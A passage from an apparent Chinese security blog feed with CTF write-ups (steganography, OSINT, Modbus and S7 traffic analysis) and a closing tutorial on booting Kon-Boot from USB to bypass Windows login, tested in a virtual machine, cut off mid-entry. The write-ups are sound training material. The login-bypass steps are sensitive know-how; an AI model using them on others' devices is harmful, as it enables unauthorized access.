    <content type="html"><![CDATA[<p>最近国庆在疯玩的时候抽空做了几题，简单记录一下。</p><h2 id="热身题目"><a href="#热身题目" class="headerlink" title="热身题目"></a>热身题目</h2><p>打开题目发现，点击不了，打开F12控制台发现flag：<br><img src="https://img-blog.csdnimg.cn/68a9afbf4aa94d8682ecb82ada51c774.png#pic_left" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/53e4fab29bc84c99ad01e6cf8e58253f.png#pic_left" alt="在这里插入图片描述"></p><h2 id="哇库哇库"><a href="#哇库哇库" class="headerlink" title="哇库哇库"></a>哇库哇库</h2><p>题目是一个带密码的压缩包，提示说密码为纯大小写。用工具爆破了一下午没有结果，本来干脆不做了，后面打开文件发现备注：阿尼亚会PINyin：哇库哇库！<br><img src="https://img-blog.csdnimg.cn/c9ccfd421c464b3592d1a00082c1235c.png#pic_left" alt="在这里插入图片描述"><br>直接尝试出密码为WAKUwaku，解压后为三个文件，前面两个是提示，后一个是花里胡哨的文件分别为：第一个提示文件逆序，第二个应该是修改图片宽度。<br><img src="https://img-blog.csdnimg.cn/9431dd2370ee48c2892f2bd333778ef2.png#pic_left" alt="在这里插入图片描述">winhex打开提取hex数据使用工具进行逆序后发现是png文件尾AE 42 60 82，缺了文件头89 50 4E 47<br><img src="https://img-blog.csdnimg.cn/31b86831e61f40159aea95f383ba8aad.png#pic_left" alt="在这里插入图片描述">添加文件头后得到一张花里胡哨的图片<br><img src="https://img-blog.csdnimg.cn/9f08ddef568c4577b283f37f2f9bbbd0.png#pic_left" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f6c17aebea2646fa9033e1f8c8dd8774.png#pic_left" alt="在这里插入图片描述"><br>结合第二个提示修改文件宽度加200后得到flag<br>哈哈阿尼亚真可爱！！<br><img src="https://img-blog.csdnimg.cn/ac467b9872c74de6b34fb2791e4a86bd.png#pic_left" alt="在这里插入图片描述"></p><h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p><img src="https://img-blog.csdnimg.cn/344fe98b01db46a69cf4f584899e77f0.png" alt="在这里插入图片描述">倒序base64解码<br><img src="https://img-blog.csdnimg.cn/c2af8f5753f54cc7b35dfc1c61f26ed7.png#pic_left" alt="在这里插入图片描述"></p><h2 id="天知地知"><a href="#天知地知" class="headerlink" title="天知地知"></a>天知地知</h2><p><img src="https://img-blog.csdnimg.cn/54de6f8885dc4882b706c25d06c4c733.png#pic_left" alt="在这里插入图片描述"><br>用1000000000000-981935301754&#x3D;18064698246</p><h2 id="你NewBee吗"><a href="#你NewBee吗" class="headerlink" title="你NewBee吗"></a>你NewBee吗</h2><p>ida打开发现flag<br><img src="https://img-blog.csdnimg.cn/b0e4bd96432249c5b50e7299a419983c.png#pic_left" alt="在这里插入图片描述"></p><h2 id="天上的路"><a href="#天上的路" class="headerlink" title="天上的路"></a>天上的路</h2><p>题目图片<br><img src="https://img-blog.csdnimg.cn/6e423df5dcdd4a72abf647fb0dfc2aa1.jpeg#pic_center#pic_left" alt="在这里插入图片描述">百度搜索关键词   彩虹路 摩托，找到溧阳一号公路的几篇新闻和推文：<br><img src="https://img-blog.csdnimg.cn/d58a32e8c92d434bacbcba4fa2310d8c.png#pic_left" alt="在这里插入图片描述"><br>发现几个与之相关的关键词：<br><img src="https://img-blog.csdnimg.cn/b194e31e64ee4b6d8c595ec77688329d.png" alt="在这里插入图片描述"><br>搜索一下发现图片与题目的照片很像，于是锁定地点为神女湖驿站。<br><img src="https://img-blog.csdnimg.cn/ce3d0479ae1243ad8f57d10cc8dcedc6.png" alt="在这里插入图片描述"><code>flag：ctfshow&#123;神女湖驿站&#125;</code></p><h2 id="都可以黑"><a href="#都可以黑" class="headerlink" title="都可以黑"></a>都可以黑</h2><p><img src="https://img-blog.csdnimg.cn/5688b2f59bc34d8a961ad6af95215d89.png#pic_left" alt="在这里插入图片描述"></p><p>题目图片<br><img src="https://img-blog.csdnimg.cn/4680dcaf1aa849749127421aa2e639ad.png#pic_left" alt="在这里插入图片描述">百度识图发现改图片出自一部电影：我是谁——没有绝对的安全系统。<br><img src="https://img-blog.csdnimg.cn/6ab29bfa01c3441c97bb3cc6bae70884.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/655a745cded6446bb82ac6764be83cbe.png" alt="在这里插入图片描述"><br>百度一下发现主角创建的黑客组织委CLAY<br><img src="https://img-blog.csdnimg.cn/f1db15fbb59442c4a552c2da19a2e271.png#pic_left" alt="在这里插入图片描述"><br>接着搜索一下客轮的名字，首先最明显的绝对是图片上最明显的那串英文，百度搜一下看看是不是客轮的名字：<br>Prins Joachim<br><img src="https://img-blog.csdnimg.cn/0e79b3e092a344c4a428d6c23878a849.png" alt="在这里插入图片描述"><br>发现以下文章有这样一句话，基本可以确定这艘客轮的名字就是Prins Joachim了。<br><img src="https://img-blog.csdnimg.cn/0cd540e1d1844f098d5ebfee4e8c364d.png" alt="在这里插入图片描述"></p><p><strong><code>flag：ctfshow&#123;CLAY_Prins_Joachim&#125;</code></strong></p><p>到底了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow摆烂杯--绀青之拳</title>
    <link href="/2022/10/10/ctfshow%E6%91%86%E7%83%82%E6%9D%AF--%E7%BB%80%E9%9D%92%E4%B9%8B%E6%8B%B3/"/>
    <url>/2022/10/10/ctfshow%E6%91%86%E7%83%82%E6%9D%AF--%E7%BB%80%E9%9D%92%E4%B9%8B%E6%8B%B3/</url>
    
    <content type="html"><![CDATA[<p>就只有这题最有思路，其他题都不会，直接摆了。<br>QR扫码：<br><img src="https://img-blog.csdnimg.cn/30b30fbc4169404796009bd50e067af9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>进入蓝奏云，获得flag.txt文件：<img src="https://img-blog.csdnimg.cn/3cb346413d12499b9297c72226792676.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="，"><br>文件内容：<br><img src="https://img-blog.csdnimg.cn/5b74520148f54b54afa8a3d635e6fcda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>联想到是emoji编码加密，所以找到了<a href="https://aghorler.github.io/emoji-aes/#decrypt">emoji-aes</a>，需要key来解码<br><img src="https://img-blog.csdnimg.cn/e8676d6440434857b9ecc89a5396f458.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>继续分析，可能有隐藏信息在刚刚那个二维码中，kali中用binwalk检测，果然藏了一张jpg图片：<br><img src="https://img-blog.csdnimg.cn/d1d6084731bd4cee847c92cb07cc74b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>foremost 分离：<br><img src="https://img-blog.csdnimg.cn/23472d0b01bb4402a2bbd6f36ca117e8.png#pic_left" alt="在这里插入图片描述"><br>得到这张图片，叫我看题目，题目名是绀青之拳，是柯南剧场版的一部电影，难道要在电影里面找key？我去，无异于大海捞针。<br><img src="https://img-blog.csdnimg.cn/133fb911153d4db88aacd53e99f284f2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>肯定还有其他信息，使用StepSolve再次打开那个二维码文件，查看有什么信息，打开后发现在文件尾藏了一串base64编码：<br><img src="https://img-blog.csdnimg.cn/301dc7079b9240fdb17a9a6b0e7ec2a2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>解码之后得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Double</span> digit number - <span class="hljs-number">1</span>:<span class="hljs-number">18</span>:<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f561b6de62ae436b8c601b80f0d85663.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>这个好像是一个时间，联想到刚刚提示在电影里面找到key，推测这可能是在电影的1:18:16的这个时间段找到key：<br><img src="https://img-blog.csdnimg.cn/38f8992ccdb84964826e1150980b1681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>发现了柯南手机里的一堆数字，感觉像是key，一个一个扣下来：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">45675865577754045976644535596437772347644664365323387454457556566664<br></code></pre></td></tr></table></figure><p>尝试解码：<br><img src="https://img-blog.csdnimg.cn/6c64689be3e54bd38900258ee6bebad3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/df0a10ae48194d83aabcf2652eefb125.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ctfshow</span><span class="hljs-template-variable">&#123;Th3_Fist_0f_Blue_Sapphir3&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GUET工控CTF</title>
    <link href="/2022/10/10/%E5%B7%A5%E6%8E%A7CTF%EF%BC%88wp%EF%BC%89/"/>
    <url>/2022/10/10/%E5%B7%A5%E6%8E%A7CTF%EF%BC%88wp%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>随意记录一下这次CTF的解题步骤。比较菜，做了几个杂项题。</p><h3 id="所见非真"><a href="#所见非真" class="headerlink" title="所见非真"></a>所见非真</h3><p>赛题描述：<br>一个刚入门的黑客在互联网进行大批量扫描后，发现某制造企业SCADA系统主机存在严重漏洞，<br>并利用该漏洞远程操纵该主机修改SCADA管理员登录密码，导致该企业无法正常监控工程状态，<br>黑客只留下了一张图片，你能帮助该企业在此图片中寻找管理员登录密码的线索吗？<br>压缩包：<br><img src="https://img-blog.csdnimg.cn/8cea58bd17734a59ab59bcee6abead37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>HACK.zip有密码打不开，打开scada.jpg：<br><img src="https://img-blog.csdnimg.cn/e0cd21e8c6cb44f2b060e1e15e9f7ed3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述">binwalk分析发现有隐藏的压缩包：</p><p>foremost分离发现：<br><img src="https://img-blog.csdnimg.cn/377471d75ed54e7c9daebcf84195ea2d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">试了一下发现是假的flag，然后也打不开HACK.zip。<br>继续对youwin这张图片进行分离发现1.1txt<br><img src="https://img-blog.csdnimg.cn/661af74653a441a6b386a3f3393e2df2.png#pic_left" alt="在这里插入图片描述"><br>这个也不是最终的flag，试试发现能打开HACK.zip，得到最终的flag：<br><img src="https://img-blog.csdnimg.cn/15f66454f3ce45a4a11db1514eea48ca.png#pic_left" alt="在这里插入图片描述"></p><h3 id="异常的流量分析"><a href="#异常的流量分析" class="headerlink" title="异常的流量分析"></a>异常的流量分析</h3><p>小张在 进行工控企业检查评估工作中，发现了上位机被恶意感染。现已提取出上位机通信流量，通过流量异常获取FLAG，flag形式为 flag{}。<br>签到题。<br><img src="https://img-blog.csdnimg.cn/34df4dd3f44b480197ce3f696cfe4d31.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="黑客的攻击"><a href="#黑客的攻击" class="headerlink" title="黑客的攻击"></a>黑客的攻击</h3><p>题目描述：某工厂车间遭受到一位名为凯撒的黑客恶意攻击，导致该车间储存罐显示表跟罐内的实际数值显示不一样。影响企业的正常生产。</p><p>根据题目打开流量包，题目提示是凯撒，想到可能是凯撒密码：<br>过滤modbus流量包<br><img src="https://img-blog.csdnimg.cn/249d55cd815241378e34850f1d6f3ba5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述">发现：<br><img src="https://img-blog.csdnimg.cn/79ad4b5b188347d8ae778f008591793a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/a82f0689f77d4f5fb0399bfe20b9582f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="黑客的大意"><a href="#黑客的大意" class="headerlink" title="黑客的大意"></a>黑客的大意</h3><p>题目：小张是一个黑客，由于刚入行不久，想去把所学习的知识进行实践，他进入了一个工厂，直连了PLC后，对PLC下发了操作指令，并对PLC进行了加密，小明在渗透工厂后，修改了PLC的连接密码，并给工厂留下了线索，请你根据当天工厂捕获的流量包，寻找小张留下的线索。</p><p>改文件后缀wireshark分析：<br>通过追踪TCP流发现：<br><img src="https://img-blog.csdnimg.cn/714fb2b76c1e4a75b62dbe933f632ff4.png#pic_left" alt="在这里插入图片描述">flag{this_is_flag}</p><h3 id="丢失的数据"><a href="#丢失的数据" class="headerlink" title="丢失的数据"></a>丢失的数据</h3><p>赛题描述：小明是一家制造厂的工程师，某天工厂遭遇了数据丢失，导致工厂无法统计当天所生产的零件数量，请你根据工厂断电前的流量包帮助工厂分析当天制造厂一共生产了多少的零件，正确答案为零件总数MD5值。<br>wireshark分析，过滤modbus.func_code &#x3D;&#x3D; 6<br><img src="https://img-blog.csdnimg.cn/71a033fc1bb748a69dd0895153206ce3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>查看data项把十六进制转为十进制相加<br><img src="https://img-blog.csdnimg.cn/1ba1f64e542848c4b27d38d83d5952af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_12,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>把相加结果转为md5值得到flag<br><img src="https://img-blog.csdnimg.cn/c4798713969f4efe8b9bfcabbd03e604.png#pic_left" alt="在这里插入图片描述"></p><h3 id="凯撒的秘密"><a href="#凯撒的秘密" class="headerlink" title="凯撒的秘密"></a>凯撒的秘密</h3><p>黑客凯撒最近很喜欢听一首歌，却不知道叫什么名字，你能根据小明给凯撒的线索，寻找出这首歌曲的名字吗？<br><img src="https://img-blog.csdnimg.cn/62a7e8d32dd443d5826b88a077fc140d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>根据题目信息，发现又是凯撒密码加密：<br><img src="https://img-blog.csdnimg.cn/6df3b93c965e4d7a9b8d9d1c566e6c07.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>16进制转字符串<br><img src="https://img-blog.csdnimg.cn/8782b17308ec4c65b14965ecf9c33e81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="工程的秘密"><a href="#工程的秘密" class="headerlink" title="工程的秘密"></a>工程的秘密</h3><p>赛题描述：黑客在渗透了某工厂的主机后，删除了工程信息，并给企业留下了备份文件，但不巧的是，黑客设置了一个恢复密码，请你帮助企业恢复工程，并找到黑客留下的信息.<br>这题需要的工具为FC组态软件：<br>下载好后对pcz文件进行恢复，发现有密码加密：<br><img src="https://img-blog.csdnimg.cn/f37f83c70ce54486a68fddddf2ffe99b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>可能为弱密码加密，多试试几个简单的密码，试了一会之后发现密码是123123，成功恢复工程文件，再点击开发，进入工程点击用户设置发现flag：<br><img src="https://img-blog.csdnimg.cn/4a4cc1a4b905416da71cdf20bfc9f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="S7协议分析"><a href="#S7协议分析" class="headerlink" title="S7协议分析"></a>S7协议分析</h3><p>赛题描述：在工控网络中，工业协议中存在异常数据。请通过流量中的数据找寻 flag。<br>wireshark分析，直接查找关键字flag，发现：<br><img src="https://img-blog.csdnimg.cn/6a2abf3bf8b1409a9fc6bab60b75e9f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="轻松时刻"><a href="#轻松时刻" class="headerlink" title="轻松时刻"></a>轻松时刻</h3><p>题目：你可以把这个当做是一个签到题，好好放松一下吧，寻找音乐中的宝藏。<br>打开题目发现是一个MP3分件和一个加密的压缩包，想到是MP3隐写。<br>打开Audacity，分析发现<br><img src="https://img-blog.csdnimg.cn/bb59cf58ef2e44f4a69ab6d92769556a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述">Password：Callalll<br>打开压缩包：<br><img src="https://img-blog.csdnimg.cn/92f09b00a1414f5ca84952a070fcd3db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="打不开的压缩包"><a href="#打不开的压缩包" class="headerlink" title="打不开的压缩包"></a>打不开的压缩包</h3><p>t题目：小明交给小白一个压缩包，说里面有重要的秘密，请小明用自己的方式打开，小明打开后发现是一个加密的压缩包，但无论如何也打不开，你能帮助小明把压缩包解开么。<br>010打开查看文件头，是一个压缩包：<br><img src="https://img-blog.csdnimg.cn/bffecbbcf01043bbb722e5759af2aa6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>先试着改文件后缀打开看看，直接看到flag</p><p>后面题目提示是说是压缩包伪加密，没想到这样直接就能得到flag。<br><img src="https://img-blog.csdnimg.cn/765c604b6804495f893aef274664bb89.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="失控的遥控"><a href="#失控的遥控" class="headerlink" title="失控的遥控"></a>失控的遥控</h3><p>赛题描述：某公司对对新建变电站进行测试,通过该变电站监控后台进行遥控测试,遥控试验发生几次遥控失败，请对抓取的遥控试验流量数据包进行协议解析并找出隐藏flag信息。<br>过滤IEC数据包后，发现这个字符有点奇怪，通过排序，点开不同的数据包把这几个字符拼接得到flag<br><img src="https://img-blog.csdnimg.cn/7cb0fc2c7dbe4400a0b37be93b895281.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>得到 flag{gongkongaq_isflag}</p><h3 id="病毒文件分析"><a href="#病毒文件分析" class="headerlink" title="病毒文件分析"></a>病毒文件分析</h3><p>题目：某工厂中上位机受到勒索病毒攻击，重要数据被加密，请将重要数据进行解密<br>发现是ganddcrad病毒<br><img src="https://img-blog.csdnimg.cn/c2d1ba28944740a19ae9b3d29981315a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><p>百度下载解密工具进行解密得到flag。</p><h3 id="OPC协议分析"><a href="#OPC协议分析" class="headerlink" title="OPC协议分析"></a>OPC协议分析</h3><p>一个黑客名叫ICSBACION，他是普莱费尔的忠实爱好者，这名黑客有一天在工控环境中插入了恶意数据并以自己的名字当做标签，请您帮助进行查找出协议数据。<br>打开数据包，用科来网络分析系统进行分析，发现异常数据包<br><img src="https://img-blog.csdnimg.cn/c4ddbd287d7c4ac8a355eab3e8f08eac.png#pic_left" alt="在这里插入图片描述">查看8805数据包发现：<br><img src="https://img-blog.csdnimg.cn/9a3f310491e54d568a5ccdb71bd2aa94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>题目提示普莱费尔，百度一下是个密码，解密得到，密钥是ICSBACION<br><img src="https://img-blog.csdnimg.cn/25ac7b10231540628233b7dc5758dc15.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"></p><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>发现一个文件，丢到kali进行分析，发现是ELF，linux下的可执行文件<br><img src="https://img-blog.csdnimg.cn/632cc4dada8741ebbe58435a13476519.png#pic_left" alt="在这里插入图片描述"><br>IDA进行分析：发现只要输入这一串字符，就可以输出flag<br><img src="https://img-blog.csdnimg.cn/075d3083d48d49ab91c55af15ddb2f48.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>kali中执行:<br><img src="https://img-blog.csdnimg.cn/29605a614ec0437eb85d7728fcd3c294.png#pic_left" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kon-boot绕过windows登录</title>
    <link href="/2022/10/10/KON-BOOT%E7%BB%95%E8%BF%87window%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%88kon-boot%202.7%EF%BC%89/"/>
    <url>/2022/10/10/KON-BOOT%E7%BB%95%E8%BF%87window%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%EF%BC%88kon-boot%202.7%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><strong>1. kon-boot是什么？</strong></p><p>Kon-Boot是市面上唯一一款可以绕过输入密码便可登录Windows以及macOS操作系统的软件。换句话说，利用Kon-Boot软件即使你不知道密码也依然可以登录设备。<br><img src="https://img-blog.csdnimg.cn/49fd42e8fb2e48088a99717533c3d4e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16,#pci_left" alt="在这里插入图片描述"></p><p> <strong>2. 工作原理</strong></p><p>KON-Boot是一款专门针对Windows、Linux、MAC登陆密码破解工具，他能绕过系统所设有的登陆密码，让你的登陆畅通无阻。KON-Boot的原理是在于处理BIOS修改系统内核的引导处理，跳过SAM的检查，直接登陆系统。</p><p> <strong>3. 下载测试验证其功能</strong><br> 下载kon-boot各版本到网上找就行。<br>下载完成以后解压为以下文件，打开konboot-USE点击install2，安装到你的U盘里，注意：这个安装会把U盘里面的所有数据清空，请备份或者使用新的U盘，以免数据丢失。<br> <img src="https://img-blog.csdnimg.cn/133ef79a90454b1eb1a39e86da71b62a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9bb8f77e396248cb845ccf2d43409fb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ccf504aea1c446da98cd51de532211d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装过程和PE盘差不多，下面进行测试<br>（1）先用window7来试试水，使用win7虚拟机来进行测试，添加硬盘，按照下面步骤弄就行<br>    <img src="https://img-blog.csdnimg.cn/e1598e99910442a99617b569375cb654.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>    <img src="https://img-blog.csdnimg.cn/2b6d2d900a1b40ca97e43febf14b835d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>    <img src="https://img-blog.csdnimg.cn/cb50b867a5fa48cab59978b828c058eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bf84b336c8a54a24a939a065c318d31f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>（2）打开window7的BIOS模式进行设置，虚拟机-&gt;电源-&gt;打开电源时进入固件<br>    <img src="https://img-blog.csdnimg.cn/8e6a25630adb403ca166280d39ea876b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>    将Hard Drive设置为最高，按+号上移，同时把VMware Virtual SCSI Hard Drive（0:1）上移最高，按F10保存退出<br>    <img src="https://img-blog.csdnimg.cn/1f7e778fc19f43a691aad4c16217de1b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br>(3)启动虚拟机，成功绕过登陆。我是事先在window7上设置好了密码，这里看到直接绕过登陆了<br><img src="https://img-blog.csdnimg.cn/a175f6ed43b14d769039a64f15f7da64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAX0FhUm9uZ18=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_left" alt="在这里插入图片描述"><br><img 